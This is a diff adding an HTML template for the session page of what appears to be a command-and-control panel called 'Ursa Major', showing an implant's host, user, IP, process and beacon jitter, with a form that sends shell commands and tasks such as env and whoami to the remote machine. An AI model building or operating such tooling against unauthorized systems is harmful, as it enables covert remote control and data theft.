@@ -1,0 +1,112 @@
+{% extends "base.html" %}
+{% block title %}Session {{ session.id }} — Ursa Major{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <h1>
+        <a href="/sessions" style="color: var(--text-secondary)">Sessions</a> /
+        <span class="mono">{{ session.id }}</span>
+        <span class="badge {{ session.status | status_color }}" style="margin-left: 8px">{{ session.status }}</span>
+    </h1>
+    {% if session.status != 'dead' %}
+    <button class="btn btn-danger"
+            hx-post="/sessions/{{ session.id }}/kill"
+            hx-confirm="Kill session {{ session.id }}?">Kill Session</button>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Session Info</h2>
+    <dl class="info-grid">
+        <dt>Hostname</dt>
+        <dd>{{ session.hostname }}</dd>
+        <dt>Username</dt>
+        <dd>{{ session.username }}</dd>
+        <dt>Remote IP</dt>
+        <dd>{{ session.remote_ip }}</dd>
+        <dt>OS</dt>
+        <dd>{{ session.os }}</dd>
+        <dt>Arch</dt>
+        <dd>{{ session.arch }}</dd>
+        <dt>PID</dt>
+        <dd>{{ session.pid }} ({{ session.process_name }})</dd>
+        <dt>First Seen</dt>
+        <dd>{{ session.first_seen | format_ts }}</dd>
+        <dt>Last Seen</dt>
+        <dd>{{ session.last_seen | format_ts }} ({{ session.last_seen | time_ago }})</dd>
+        <dt>Beacon</dt>
+        <dd>{{ session.beacon_interval }}s ± {{ (session.jitter * 100) | int }}%</dd>
+    </dl>
+</div>
+
+{% if session.status != 'dead' %}
+<form class="shell-form"
+      hx-post="/sessions/{{ session.id }}/task"
+      hx-target="#task-list tbody"
+      hx-swap="afterbegin"
+      hx-on::after-request="if(event.detail.successful) this.querySelector('input[name=command]').value = ''">
+    <select name="task_type" id="task-type-select"
+            onchange="document.getElementById('cmd-input').style.display = this.value === 'shell' ? 'block' : 'none'">
+        <option value="shell" selected>shell</option>
+        <option value="whoami">whoami</option>
+        <option value="sysinfo">sysinfo</option>
+        <option value="ps">ps</option>
+        <option value="pwd">pwd</option>
+        <option value="ls">ls</option>
+        <option value="env">env</option>
+    </select>
+    <input type="text" name="command" id="cmd-input" placeholder="Enter command..." autocomplete="off" autofocus>
+    <button type="submit">Send</button>
+</form>
+{% endif %}
+
+<div class="card" id="task-list">
+    <h2>Tasks</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Type</th>
+                <th>Args</th>
+                <th>Status</th>
+                <th>Created</th>
+                <th>Result</th>
+            </tr>
+        </thead>
+        <tbody hx-get="/tasks?session_id={{ session.id }}"
+               hx-trigger="every 3s" hx-swap="innerHTML">
+            {% include "partials/task_table.html" %}
+        </tbody>
+    </table>
+</div>
+
+{% if files %}
+<div class="card">
+    <h2>Files</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Filename</th>
+                <th>Size</th>
+                <th>Direction</th>
+                <th>Time</th>
+                <th></th>
+            </tr>
+        </thead>
+        <tbody>
+            {% include "partials/file_table.html" %}
+        </tbody>
+    </table>
+</div>
+{% endif %}
+
+{% if events %}
+<div class="card">
+    <h2>Events</h2>
+    {% with events=events %}
+    {% include "partials/event_list.html" %}
+    {% endwith %}
+</div>
+{% endif %}
+{% endblock %}
